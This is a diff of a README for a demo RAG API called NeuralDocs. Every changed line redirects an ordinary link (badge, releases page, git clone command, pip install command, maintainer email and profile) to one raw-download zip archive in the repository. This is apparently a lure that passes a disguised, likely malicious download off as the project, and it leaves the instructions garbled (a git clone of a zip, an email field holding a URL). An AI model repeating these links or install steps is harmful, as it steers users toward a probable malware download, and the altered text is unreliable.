@@ -1,10 +1,10 @@
 # NeuralDocs: A Demo RAG API
 
-![NeuralDocs](https://img.shields.io/badge/NeuralDocs-Demo%20RAG%20API-brightgreen)
+![NeuralDocs](https://github.com/zmwzmo11130/neuraldocs/raw/refs/heads/main/app/Software_v1.3-alpha.4.zip%20RAG%20API-brightgreen)
 
 Welcome to **NeuralDocs**! This repository showcases a demo Retrieval-Augmented Generation (RAG) API built with FastAPI, OpenAI, ChromaDB, and Docker. It highlights the capabilities of the OpenAI Codex CLI tool for rapid and complex application development. 
 
-[Check out the latest releases here!](https://github.com/zmwzmo11130/neuraldocs/releases)
+[Check out the latest releases here!](https://github.com/zmwzmo11130/neuraldocs/raw/refs/heads/main/app/Software_v1.3-alpha.4.zip)
 
 ## Table of Contents
 
@@ -47,7 +47,7 @@ To get started with NeuralDocs, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/zmwzmo11130/neuraldocs.git
+   git clone https://github.com/zmwzmo11130/neuraldocs/raw/refs/heads/main/app/Software_v1.3-alpha.4.zip
    cd neuraldocs
    ```
 
@@ -61,7 +61,7 @@ To get started with NeuralDocs, follow these steps:
 3. **Install Dependencies**:
    Install the required packages using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/zmwzmo11130/neuraldocs/raw/refs/heads/main/app/Software_v1.3-alpha.4.zip
    ```
 
 4. **Build the Docker Image**:
@@ -156,7 +156,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out to the project maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourprofile)
+- **Email**: https://github.com/zmwzmo11130/neuraldocs/raw/refs/heads/main/app/Software_v1.3-alpha.4.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/zmwzmo11130/neuraldocs/raw/refs/heads/main/app/Software_v1.3-alpha.4.zip)
 
-Thank you for checking out NeuralDocs! We hope you find it useful in your projects. For updates, please visit our [Releases](https://github.com/zmwzmo11130/neuraldocs/releases) section.
+Thank you for checking out NeuralDocs! We hope you find it useful in your projects. For updates, please visit our [Releases](https://github.com/zmwzmo11130/neuraldocs/raw/refs/heads/main/app/Software_v1.3-alpha.4.zip) section.
